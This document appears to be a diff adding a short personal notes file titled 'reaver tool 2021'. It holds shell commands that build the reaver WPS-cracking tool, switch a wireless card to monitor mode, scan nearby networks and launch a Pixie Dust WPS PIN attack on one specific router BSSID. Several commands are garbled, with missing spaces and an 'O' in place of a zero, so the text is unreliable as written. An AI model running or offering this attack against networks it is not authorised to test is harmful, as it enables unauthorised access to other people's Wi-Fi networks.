@@ -1,0 +1,27 @@
+reaver tool 2021
+
+
+sudo apt y install build-essential libpcap-dev aircrack-ng
+pixiewps
+
+
+
+
+git clone https://github.com/t6x/reaver-wps-fork-t6x
+
+cd reaver-wps-fork-t6x
+
+cd src
+
+./configure
+
+make
+
+sudo make install
+
+sudo airmon-ng start wlan0
+
+sudo airodump-ng wlanOmon
+
+sudo reaver-i wlan0mon-c 1 -b D4:6E:0E:7D:62:28 -wv-K
+1-f
